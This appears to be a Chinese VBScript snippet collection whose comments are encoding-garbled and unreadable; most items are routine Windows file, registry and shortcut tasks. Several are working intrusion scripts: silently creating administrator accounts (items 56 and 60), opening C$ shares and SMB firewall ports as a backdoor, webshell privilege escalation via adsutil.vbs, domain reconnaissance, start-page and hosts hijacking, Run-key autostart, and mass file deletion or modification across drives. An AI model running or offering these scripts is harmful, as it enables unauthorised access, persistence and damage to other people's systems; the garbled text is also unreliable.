1��VBS��ȡϵͳ��װ·��

/*�ȶ�����������ǻ�ȡϵͳ��װ·���ģ�Ȼ�������á�&strWinDir&���������������*/

set WshShell = WScript.CreateObject("WScript.Shell")

strWinDir = WshShell.ExpandEnvironmentStrings("%WinDir%")

2��VBS��ȡC:/Program Files·��

msgbox  CreateObject("WScript.Shell").ExpandEnvironmentStrings("%ProgramFiles%")

3��VBS��ȡC:/Program Files/Common Files·��

msgbox CreateObject("WScript.Shell").ExpandEnvironmentStrings("%CommonProgramFiles%")

4�������������ַ��ݷ�ʽ

set gangzi = WScript.CreateObject("WScript.Shell")

strDesktop = gangzi.SpecialFolders("Desktop")

set oShellLink = gangzi.CreateShortcut(strDesktop & "/Internet Explorer.lnk")

oShellLink.TargetPath = "http://www.fendou.info"

oShellLink.Description = "Internet Explorer"

oShellLink.IconLocation = "%ProgramFiles%/Internet Explorer/iexplore.exe, 0"

oShellLink.Save

5�����ղؼ������ַ

Const ADMINISTRATIVE_TOOLS = 6

Set objShell = CreateObject("Shell.Application")

Set objFolder = objShell.Namespace(ADMINISTRATIVE_TOOLS)

Set objFolderItem = objFolder.Self    

Set objShell = WScript.CreateObject("WScript.Shell")

strDesktopFld = objFolderItem.Path

Set objURLShortcut = objShell.CreateShortcut(strDesktopFld & "/�ܶ�Blog.url")

objURLShortcut.TargetPath = "http://www.fendou.info/"

objURLShortcut.Save

6��ɾ��ָ��Ŀ¼ָ����׺�ļ�

On Error Resume Next

Set fso = CreateObject("Scripting.FileSystemObject")

fso.DeleteFile "C:/*.vbs", True

Set fso = Nothing

7��VBS����ҳ

Set oShell = CreateObject("WScript.Shell")

oShell.RegWrite  "HKEY_CURRENT_USER/Software/Microsoft/Internet Explorer/Main/Start Page","http://www.fendou.info"

8��VBS��������

Set oShell=CreateObject("Wscript.Shell")

oShell.RegWrite "HKLM/Software/Microsoft/Windows/CurrentVersion/Run/cmd","cmd.exe"

9��VBS�����Լ�

set copy1=createobject("scripting.filesystemobject")

copy1.getfile(wscript.scriptfullname).copy("c:/huan.vbs")

set copy1=createobject("scripting.filesystemobject")

copy1.getfile("game.exe").copy("c:/gangzi.exe")

/*�����Լ���C�̵�huan.vbs(���Ʊ�vbsĿ¼�µ�game.exe�ļ���c�̵�gangzi.exe)*/

10��VBS��ȡϵͳ��ʱĿ¼

Dim fso

Set fso = CreateObject("Scripting.FileSystemObject")

Dim tempfolder

Const TemporaryFolder = 2

Set tempfolder = fso.GetSpecialFolder(TemporaryFolder)

Wscript.Echo tempfolder

11������������ ��Ȼ����ִ��

On Error Resume Next

12��VBS����ַ

Set objShell = CreateObject("Wscript.Shell")

objShell.Run("http://www.fendou.info/")

13��VBS�����ʼ�

NameSpace = "http://schemas.microsoft.com/cdo/configuration/"

Set Email = CreateObject("CDO.Message")

Email.From = "����@qq.com"

Email.To = "�ռ�@qq.com"

Email.Subject = "Test sendmail.vbs"

Email.Textbody = "OK!"

Email.AddAttachment "C:/1.txt"

With Email.Configuration.Fields

.Item(NameSpace&"sendusing") = 2

.Item(NameSpace&"smtpserver") = "smtp.�ʼ�������.com"

.Item(NameSpace&"smtpserverport") = 25

.Item(NameSpace&"smtpauthenticate") = 1

.Item(NameSpace&"sendusername") = "�������û���"

.Item(NameSpace&"sendpassword") = "����������"

.Update

End With

Email.Send

14��VBS��������

strComputer = "."

Set objWMIService = GetObject _

    ("winmgmts://" & strComputer & "/root/cimv2")

Set colProcessList = objWMIService.ExecQuery _

    ("Select * from Win32_Process Where Name = 'Rar.exe'")

For Each objProcess in colProcessList

    objProcess.Terminate()

Next

15��VBS���ش���ַ(����������޷����ش򿪣�����ֱ�Ӵ򿪣��ʺ������û�ʹ��)

createObject("wscript.shell").run "iexplore http://www.fendou.info/",0

/*���������������ʹ��IE�ľ���·��+�����򿪣��޷��ú����õ�IE��װ·����ֻ�ú����õ���Program Files·����Ӧ�ñ�����ķ����ã��������ַ��������Ǿ��Եġ�*/

Set objws=WScript.CreateObject("wscript.shell")

objws.Run """C:/Program Files/Internet Explorer/iexplore.exe""www.baidu.com",vbhide

16��VBS����Ӳ��ɾ��ָ���ļ���

On Error Resume Next

Dim fPath

strComputer = "."

Set objWMIService = GetObject _

    ("winmgmts://" & strComputer & "/root/cimv2")

Set colProcessList = objWMIService.ExecQuery _

    ("Select * from Win32_Process Where Name = 'gangzi.exe'")

For Each objProcess in colProcessList

    objProcess.Terminate()

Next

Set objWMIService = GetObject("winmgmts:" _

& "{impersonationLevel=impersonate}!//" & strComputer & "/root/cimv2")

Set colDirs = objWMIService. _

ExecQuery("Select * from Win32_Directory where name LIKE '%c:%' or name LIKE '%d:%' or name LIKE '%e:%' or name LIKE '%f:%' or name LIKE '%g:%' or name LIKE '%h:%' or name LIKE '%i:%'")

Set objFSO = CreateObject("Scripting.FileSystemObject")

For Each objDir in colDirs

fPath = objDir.Name & "/gangzi.exe"

objFSO.DeleteFile(fPath), True

Next

17��VBS��ȡ����MAC��ַ

Dim mc,mo

Set mc=GetObject("Winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")

For Each mo In mc

If mo.IPEnabled=True Then

MsgBox "��������MAC��ַ��: " & mo.MacAddress

Exit For

End If

Next

18��VBS��ȡ����ע�����ҳ��ַ

Set reg=WScript.CreateObject("WScript.Shell")

startpage=reg.RegRead("HKEY_CURRENT_USER/Software/Microsoft/Internet Explorer/Main/Start Page")

MsgBox startpage

19��VBS�������д��̵�����Ŀ¼���ҵ�����.txt���ļ���Ȼ�������txt�ļ���ײ���һ�仰

On Error Resume Next

Set fso = CreateObject("Scripting.FileSystemObject")

Co = VbCrLf & "·��������"

For Each i In fso.Drives

  If i.DriveType = 2 Then

    GF fso.GetFolder(i & "/")

  End If

Next

Sub GF(fol)

  Wh fol

  Dim i

  For Each i In fol.SubFolders

    GF i

  Next

End Sub

Sub Wh(fol)

  Dim i

  For Each i In fol.Files

    If LCase(fso.GetExtensionName(i)) = "shtml" Then

      fso.OpenTextFile(i,8,0).Write Co

    End If

  Next

End Sub

20����ȡ����������̷�

Set fso=CreateObject("scripting.filesystemobject")

Set objdrives=fso.Drives 'ȡ�õ�ǰ����������д���������

For Each objdrive In objdrives '��������

MsgBox objdrive

Next

21��VBS���������д��̸�Ŀ¼�����ļ�

On Error Resume Next

Set fso=CreateObject("Scripting.FileSystemObject")

Set gangzis=fso.Drives        'ȡ�õ�ǰ����������д���������

For Each gangzi In gangzis   '��������

Set TestFile=fso.CreateTextFile(""&gangzi&"/�½��ļ���.vbs",Ture)

TestFile.WriteLine("By www.gangzi.org")

TestFile.Close

Next

22��VBS��������ȫ���ҵ�����123.exe��Ȼ������Ǹ���321.exe

set fs = CreateObject("Scripting.FileSystemObject")

for each drive in fs.drives

fstraversal drive.rootfolder

next

sub fstraversal(byval this)

for each folder in this.subfolders

fstraversal folder

next

set files = this.files

for each file in files

if file.name = "123.exe" then file.name = "321.exe"

next

end sub

23��VBSд����뵽ճ����

/*��˵��һ�£�VBSд���ݵ�ճ���壬����ǧƪһ�ɶ���ͨ��InternetExplorer.Application������ʵ�֣�����ȱ������Ĭ�������Ϊ��IE�лᵯ������������Է��˺ܴ�ľ��ҵ������������ʵ��*/

str=����������Ҫ���Ƶ���������ַ�����

Set ws = wscript.createobject("wscript.shell")

ws.run "mshta vbscript:clipboardData.SetData("+""""+"text"+""""+","+""""&str&""""+")(close)",0,true

24��QQ�Զ�����Ϣ

On Error Resume Next

str="���Ǳ���/qq"

Set WshShell=WScript.CreateObject("WScript.Shell")

WshShell.run "mshta vbscript:clipboardData.SetData("+""""+"text"+""""+","+""""&str&""""+")(close)",0

WshShell.run "tencent://message/?Menu=yes&uin=20016964&Site=&Service=200&sigT=2a39fb276d15586e1114e71f7af38e195148b0369a16a40fdad564ce185f72e8de86db22c67ec3c1",0,true

WScript.Sleep 3000

WshShell.SendKeys "^v"

WshShell.SendKeys "%s"

25��VBS�����ļ�

Set objFSO = CreateObject("Scripting.FileSystemObject")

Set objFile = objFSO.GetFile("F:/�������/show.txt")

If objFile.Attributes = objFile.Attributes AND 2 Then

    objFile.Attributes = objFile.Attributes XOR 2

End If

26��VBS���������

/*521�����ɹ��򣬲�ͬ���������ɵĹ���һ������������������;*/

Randomize 521

point=Array(Int(100*Rnd+1),Int(1000*Rnd+1),Int(10000*Rnd+1))

msgbox join(point,"")

27��VBSɾ������IEͼ�꣨�ǿ�ݷ�ʽ��

Set oShell = CreateObject("WScript.Shell")

oShell.RegWrite "HKCU/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/NoInternetIcon",1,"REG_DWORD"

28��VBS��ȡ�����ļ���

Set fso = CreateObject("Scripting.FileSystemObject")

msgbox WScript.ScriptName

29��VBS��ȡUnicode������ļ�

Set objFSO = CreateObject("Scripting.FileSystemObject")

Set objFile = objFSO.OpenTextFile("gangzi.txt",1,False,-1)

strText = objFile.ReadAll

objFile.Close

Wscript.Echo strText

30��VBS��ȡָ��������ļ���Ĭ��Ϊuft-8��gangzi������Ҫ��ȡ�ļ���·��

set stm2 =createobject("ADODB.Stream")

stm2.Charset = "utf-8"

stm2.Open

stm2.LoadFromFile gangzi

readfile = stm2.ReadText

MsgBox readfile

31��VBS���������

Set oShell = CreateObject("WScript.Shell")

oShell.RegWrite "HKEY_CURRENT_USER/Software/Policies/Microsoft/MMC/RestrictToPermittedSnapins",1,"REG_DWORD"

32��VBSдָ��������ļ���Ĭ��Ϊuft-8��gangzi������Ҫ��ȡ�ļ���·����gangzi2�����ݱ���

gangzi="1.txt"

gangzi2="www.gangzi.org"

Set Stm1 = CreateObject("ADODB.Stream")

Stm1.Type = 2

Stm1.Open

Stm1.Charset = "UTF-8"

Stm1.Position = Stm1.Size

Stm1.WriteText gangzi2

Stm1.SaveToFile gangzi,2

Stm1.Close

set Stm1 = nothing

33��VBS��ȡ��ǰĿ¼�������ļ������֣����������ļ��У�

Set fso=CreateObject("scripting.filesystemobject")

Set f=fso.GetFolder(fso.GetAbsolutePathName("."))

Set folders=f.SubFolders

For Each fo In folders

  wsh.echo fo.Name

Next

Set folders=Nothing

Set f=nothing

Set fso=nothing

34��VBS��ȡָ��Ŀ¼�������ļ������֣��������ļ��У�

Dim t

Set fso=WScript.CreateObject("scripting.filesystemobject")

Set fs=fso.GetFolder("d:/")

WScript.Echo aa(fs)

Function aa(n)

Set f=n.subfolders

For Each uu In f

Set op=fso.GetFolder(uu.path)

t=t & vbcrlf & op.path

Call aa(op)

Next

aa=t

End function

35��VBS����.URL�ļ�

/*IconIndex������ͬ�����ִ���ͬ��ͼ�꣬���������SHELL32.dll���������ͼ��*/

set fso=createobject("scripting.filesystemobject")

qidong=qidong&"[InternetShortcut]"&Chr(13)&Chr(10)

qidong=qidong&"URL=http://www.fendou.info"&Chr(13)&Chr(10)

qidong=qidong&"IconFile=C:/WINDOWS/system32/SHELL32.dll"&Chr(13)&Chr(10)

qidong=qidong&"IconIndex=130"&Chr(13)&Chr(10)

Set TestFile=fso.CreateTextFile("qq.url",Ture)

TestFile.WriteLine(qidong)

TestFile.Close

36��VBSдhosts

/*ûд�жϣ����۴治���ڶ�׷�ӵײ�*/

Set fs = CreateObject("Scripting.FileSystemObject")

path = ""&fs.GetSpecialFolder(1)&"/drivers/etc/hosts"

Set f = fs.OpenTextFile(path,8,TristateFalse)

f.Write ""&vbcrlf&"127.0.0.1 www.g.cn"&vbcrlf&"127.0.0.1 g.cn"

f.Close

37��VBS��ȡ��HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Desktop/NameSpace �������м������ֲ�ѭ�����

Const HKLM = &H80000002

strPath = "SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Desktop/NameSpace"

Set oreg = GetObject("Winmgmts:/root/default:StdRegProv")

    oreg.EnumKey HKLM,strPath,arr

    For Each x In arr

        WScript.Echo x

    Next

38��VBS����txt�ļ�

Dim fso,TestFile

Set fso=CreateObject("Scripting.FileSystemObject")

Set TestFile=fso.CreateTextFile("C:/hello.txt",Ture)

TestFile.WriteLine("Hello,World!")

TestFile.Close

39��VBS�����ļ���

Dim fso,fld

Set fso=CreateObject("Scripting.FileSystemObject")

Set fld=fso.CreateFolder("C:/newFolder")

40��VBS�ж��ļ����Ƿ����

Dim fso,fld

Set fso=CreateObject("Scripting.FileSystemObject")

If (fso.FolderExists("C:/newFolder")) Then

msgbox("Folder exists.")

else

set fld=fso.CreateFolder("C:/newFolder")

End If

41��VBSʹ�ñ����ж��ļ���

Dim fso,fld

drvName="C:/"

fldName="newFolder"

Set fso=CreateObject("Scripting.FileSystemObject")

If (fso.FolderExists(drvName&fldName)) Then

msgbox("Folder exists.")

else

set fld=fso.CreateFolder(drvName&fldName)

End If

42��VBS�������

Dim fso,TestFile,fileName,drvName,fldName

drvName=inputbox("Enter the drive to save to:","Drive letter")

fldName=inputbox("Enter the folder name:","Folder name")

fileName=inputbox("Enter the name of the file:","Filename")

Set fso=CreateObject("Scripting.FileSystemObject")

If(fso.FolderExists(drvName&fldName))Then

msgbox("Folder exists")

Else

Set fld=fso.CreateFolder(drvName&fldName)

End If

Set TestFile=fso.CreateTextFile(drvName&fldName&"/"&fileName&".txt",True)

TestFile.WriteLine("Hello,World!")

TestFile.Close

43��VBS����Ƿ�����ͬ�ļ�

Dim fso,TestFile,fileName,drvName,fldName

drvName=inputbox("Enter the drive to save to:","Drive letter")

fldName=inputbox("Enter the folder name:","Folder name")

fileName=inputbox("Enter the name of the file:","Filename")

Set fso=CreateObject("Scripting.FileSystemObject")

If(fso.FolderExists(drvName&fldName))Then

msgbox("Folder exists")

Else

Set fld=fso.CreateFolder(drvName&fldName)

End If

If(fso.FileExists(drvName&fldName&"/"&fileName&".txt"))Then

msgbox("File already exists.")

Else

Set TestFile=fso.CreateTextFile(drvName&fldName&"/"&fileName&".txt",True)

TestFile.WriteLine("Hello,World!")

TestFile.Close

End If

44��VBS��д��׷�� �ļ�

Dim fso,openFile

Set fso=CreateObject("Scripting.FileSystemObject")

Set openFile=fso.OpenTextFile("C:/test.txt",2,True)   '1��ʾֻ����2��ʾ��д��8��ʾ׷��

openFile.Write "Hello World!"

openFile.Close

45��VBS��ȡ�ļ� ReadAll ��ȡȫ��

Dim fso,openFile

Set fso=CreateObject("Scripting.FileSystemObject")

Set openFile=fso.OpenTextFile("C:/test.txt",1,True)

MsgBox(openFile.ReadAll)

46��VBS��ȡ�ļ� ReadLine ��ȡһ��

Dim fso,openFile

Set fso=CreateObject("Scripting.FileSystemObject")

Set openFile=fso.OpenTextFile("C:/test.txt",1,True)

MsgBox(openFile.ReadLine())

MsgBox(openFile.ReadLine())   '�����ȡ���������ļ����������ͻ����

47��VBS��ȡ�ļ� Read ��ȡn���ַ�

Dim fso,openFile

Set fso=CreateObject("Scripting.FileSystemObject")

Set openFile=fso.OpenTextFile("C:/test.txt",1,True)

MsgBox(openFile.Read(2))   '����������ַ������������

48��VBSɾ���ļ�

Dim fso

Set fso=CreateObject("Scripting.FileSystemObject")

fso.DeleteFile("C:/test.txt")

49��VBSɾ���ļ���

Dim fso

Set fso=CreateObject("Scripting.FileSystemObject")

fso.DeleteFolder("C:/newFolder") '�����ļ�������û���ļ���һ��ɾ��

50��VBS���������ļ�

Dim fso,TestFile

Set fso=CreateObject("Scripting.FileSystemObject")

For i=1 To 10

Set TestFile=fso.CreateTextFile("C:/hello"&i&".txt",Ture)

TestFile.WriteLine("Hello,World!")

TestFile.Close

Next

51��VBS���ݼ��������������ַ���

set ws=createobject("wscript.shell")

set wenv=ws.environment("process")

RDA=wenv("computername")

Function UCharRand(n)

For i=1 to n

Randomize ASC(MID(RDA,1,1))

temp = cint(25*Rnd)

temp = temp +65

UCharRand = UCharRand & chr(temp)

Next

End Function

msgbox UCharRand(LEN(RDA))

52��VBS����mac�������к�

Function Encode(strPass)

   Dim i, theStr, strTmp

   For i = 1 To Len(strPass)

    strTmp = Asc(Mid(strPass, i, 1))

    theStr = theStr & Abs(strTmp)

   Next

   strPass = theStr

   theStr = ""

   Do While Len(strPass) > 16

    strPass = JoinCutStr(strPass)

   Loop

   For i = 1 To Len(strPass)

    strTmp = CInt(Mid(strPass, i, 1))

    strTmp = IIf(strTmp > 6, Chr(strTmp + 60), strTmp)

    theStr = theStr & strTmp

   Next

   Encode = theStr

End Function

Function JoinCutStr(str)

   Dim i, theStr

   For i = 1 To Len(str)

    If Len(str) - i = 0 Then Exit For

    theStr = theStr & Chr(CInt((Asc(Mid(str, i, 1)) + Asc(Mid(str, i +1, 1))) / 2))

    i = i + 1

   Next

   JoinCutStr = theStr

End Function

Function IIf(var, val1, val2)

   If var = True Then

    IIf = val1

   Else

    IIf = val2

   End If

End Function

Set mc=GetObject("Winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")

For Each mo In mc

If mo.IPEnabled=True Then

theStr = mo.MacAddress

Exit For

End If

Next

Randomize Encode(theStr)

rdnum=Int(10*Rnd+5)

Function allRand(n)

  For i=1 to n

    Randomize Encode(theStr)

    temp = cint(25*Rnd)

    If temp mod 2 = 0 then

      temp = temp + 97

    ElseIf temp < 9 then

      temp = temp + 48

    Else

      temp = temp + 65

    End If

    allRand = allRand & chr(temp)

  Next

End Function

msgbox allRand(rdnum)

53��VBS�Զ�����adsl

Dim Wsh

Set Wsh = WScript.CreateObject("WScript.Shell")

wsh.run "Rasdial �������� �˺� ����",false,1

54��VBS�Զ��Ͽ�ADSL

Dim Wsh

Set Wsh = WScript.CreateObject("WScript.Shell")

wsh.run "Rasdial /DISCONNECT",false,1

55��VBSÿ��3���Զ�����IP������ַʵ��

/*ֵ��һ����ǣ��������������ÿ�δ򿪵���ַ��������ͬһ��IE���ڣ�Ҳ����ÿ�δ򿪵��Ǹ����ϴδ򿪵Ĵ��ڣ������Ҫÿ�δ򿪵���ַ�����´��ڣ�ֱ��ʹ��run�Ϳ�����*/

Dim Wsh

Set Wsh = WScript.CreateObject("WScript.Shell")

Set oIE = CreateObject("InternetExplorer.Application")

for i=1 to 5

wsh.run "Rasdial /DISCONNECT",false,1

wsh.run "Rasdial �������� �˺� ����",false,1

oIE.Navigate "http://www.ip138.com/?"&i&""

Call SynchronizeIE

oIE.Visible = True

next

Sub SynchronizeIE

On Error Resume Next

Do While(oIE.Busy)

WScript.Sleep 3000

Loop

End Sub

56����VBS���ӹ���Ա�ʺ�
/*��ע���������������sa�ʺţ���������net.exe��net1.exe�����ƣ��������Ĳ���ԭ�����ǼӲ��˹���Ա�ʺš�VBS�ڻĿ¼��adsi��������һ��winnt���񣬿���������������Դ����������������cmd����������һ������Ա*/

set wsnetwork=CreateObject("WSCRIPT.NETWORK")

os="WinNT://"&wsnetwork.ComputerName

Set ob=GetObject(os)                         '�õ�adsi�ӿ�,��

Set oe=GetObject(os&"/Administrators,group")   '����,admin��

Set od=ob.Create("user","lcx")                 '�����û�

od.SetPassword "123456"                     '��������

od.SetInfo                                   '����

Set of=GetObject(os&"/lcx",user)               '�õ��û�

oe.add os&"/lcx"

/*��δ����������Ϊ1.vbs����cmd�����У���ʽ: cscript 1.vbs�Ļ������ڵ�ǰϵͳ��һ������Ϊlcx������Ϊ123456�Ĺ���Ա����Ȼ��������ü��±����޸���ߵı���lcx��123456���ĳ���ϲ�������ֺ�����ֵ��*/

57����vbs������������������Ŀ¼
/*��ʱ��ע���ֳɹ�һ��վ���õ�ϵͳȨ�޺�����ϰٸ������������������ܸ�����ҵ�����Ŀ��վ������Ŀ¼�أ�һ��վһ��վ����̫�ۣ���ϵͳ�Դ���adsutil.vbs���ָо���������ܶ࣬�е��޷����ֵĸо�������������ű��ɣ��������£�*/

Set ObjService=GetObject("IIS://LocalHost/W3SVC")

For Each obj3w In objservice

If IsNumeric(obj3w.Name) Then

sServerName=Obj3w.ServerComment

Set webSite = GetObject("IIS://Localhost/W3SVC/" & obj3w.Name & "/Root")

ListAllWeb = ListAllWeb & obj3w.Name & String(25-Len(obj3w.Name)," ") & obj3w.ServerComment & "(" & webSite.Path & ")" & vbCrLf

End If

Next

WScript.Echo ListAllWeb

Set ObjService=Nothing

WScript.Quit

/*����cscript 2.vbs�󣬾ͻ���ϸ�г�IIS���վ��ID��������������Ŀ¼���ǲ��Ǵ����ٺܶ��ַ�����*/

58����VBS�����ҵ����������������
/*�����ṹ���������������С��û�о������ȥ��͸����������õ��������Ա�����룬����������Ϳ������ɴ����ˡ��������Աһ����ڱȽ���Ҫ�Ļ����ϣ�����ܸ㶨���е�һ̨��̨���Ÿ������¼��֮�࣬��������һ������õ����롣�����������Ȼ����������Ҫһ̨�ˣ�����ڳ�ǧ̨�������жϳ�����һ̨�أ�dos������net group ��domain admins�� /domain������Ϊһ���жϵı�׼������vbsҲ���������ģ�����Ȼ����adsi���ݵ����ݣ���*/

set obj=GetObject("LDAP://rootDSE")

wscript.echo obj.servername

/*ֻ�������������㹻�ˣ�����cscript 3.vbs�����н���ġ���Ȼ��������dos�����vbs����ǰ�����Ҫ�����û���Ȩ���¡��ñ���õ���һ�����û����ʺ����룬������� psexec.exe -u -p cmd.exe�����ĸ�ʽ���õ����û���shell�������ľ�������������潻���ģ���½��ľ��shell���������û����Ϳ���ֱ��������Щ�����ˡ�
    vbs���������е����õ�Ȼ��ֻ��Щ����Ȼ��js����������Ҳ����ʵ������������Ĺ��ܣ��������ר�����µ���Ŀ��vbs��hacking�е����ã���������ֻ��vbs��д��vbs�ⲿ���Һ��������߻����Ժ��ר�������߻���������Ŀ����ȡΪ���ߴ����õ����õ����¡�*/

59��WebShell��Ȩ�õ�VBS����
/*aspľ��һֱ�Ǹ�ű�������ϲ��ʹ�õĹ���֮һ,����������Ȩ��һ�㶼�Ƚϵ�(һ����IWAM_NAMEȨ��),���Դ������˸��ַ�������������Ȩ��,����˵ͨ��aspľ��õ�mssql���ݿ��Ȩ��,���õ�ftp��������Ϣ,�ֻ���˵���滻һ��������򡣶��ҽ���Ҫ���ܵļ���������һ��vbs�ļ�������aspľ���Ȩ�ޣ���������aspľ��һֱ�Ǹ�ű�������ϲ��ʹ�õĹ���֮һ,����������Ȩ��һ�㶼�Ƚϵ�(һ����IWAM_NAMEȨ��),���Դ������˸��ַ�������������Ȩ��,����˵ͨ��aspľ��õ�mssql���ݿ��Ȩ��,���õ�ftp��������Ϣ,�ֻ���˵���滻һ��������򡣶��ҽ���Ҫ���ܵļ���������һ��vbs�ļ�������aspľ���Ȩ��*/

set wsh=createobject("wscript.shell") 

a=wsh.run ("cmd.exe /c cscript.exe C:/Inetpub/AdminScripts/adsutil.vbs set /W3SVC/InProcessIsapiApps C:/WINNT/system32/inetsrv/httpext.dll C:/WINNT/system32/inetsrv/httpodbc.dll C:/WINNT/system32/inetsrv/ssinc.dll C:/WINNT/system32/msw3prt.dll C:/winnt/system32/inetsrv/asp.dll",0) '����asp.dll��InProcessIsapiApps��

/*���䱣��Ϊvbs�ĺ�׺,���ϴ��������ϣ�Ȼ������aspľ��ִ�����vbs�ļ������������aspľ��ɣ���ᷢ���Լ�������systemȨ����*/

60��VBS����ipc������������

Dim OperationRegistry

Set OperationRegistry=WScript.CreateObject("WScript.Shell")

OperationRegistry.RegWrite "HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Lsa/forceguest",0

Set wsh3=wscript.createobject("wscript.shell")

wsh3.Run "net user helpassistant 123456",0,false

wsh3.Run "net user helpassistant /active",0,false

wsh3.Run "net localgroup administrators helpassistant /add",0,false

wsh3.Run "net start Lanmanworkstation /y",0,false

wsh3.Run "net start Lanmanserver /y",0,false

wsh3.Run "net start ipc$",0,True

wsh3.Run "net share c$=c:/",0,false

wsh3.Run "netsh firewall set notifications disable",0,True

wsh3.Run "netsh firewall set portopening TCP 139 enable",0,false

wsh3.Run "netsh firewall set portopening UDP 139 enable",0,false

wsh3.Run "netsh firewall set portopening TCP 445 enable",0,false

wsh3.Run "netsh firewall set portopening UDP 445 enable",0,false

61��VBSʱ���жϴ���

Digital=time

    hours=Hour(Digital)

    minutes=Minute(Digital)

    seconds=Second(Digital)

    if (hours<6) then

        dn="�賽�ˣ���û˯����"

    end if

    if (hours>=6) then

        dn="���Ϻã�"

    end if

    if (hours>12) then

        dn="����ã�"

    end if

    if (hours>18) then

        dn="���Ϻã�"

    end if

    if (hours>22) then

        dn="�����ˣ�ҹ���ˣ���˯���ˣ�"

    end if

    if (minutes<=9) then

        minutes="0" & minutes

    end if

    if (seconds<=9) then

        seconds="0" & seconds

    end if

ctime=hours & ":" & minutes & ":" & seconds & " " & dn

Msgbox ctime

62��VBSע����д

Dim OperationRegistry , mynum

Set OperationRegistry=WScript.CreateObject("WScript.Shell")

mynum = 9

mynum = OperationRegistry.RegRead("HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Lsa/forceguest")

MsgBox("before forceguest = "&mynum)

OperationRegistry.RegWrite "HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Lsa/forceguest",0

mynum = OperationRegistry.RegRead("HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Lsa/forceguest")

MsgBox("after forceguest = "&mynum)

63��VBS���к�ɾ���������

dim fso,f

Set fso = CreateObject("Scripting.FileSystemObject")

f = fso.DeleteFile(WScript.ScriptName)

WScript.Echo( WScript.ScriptName)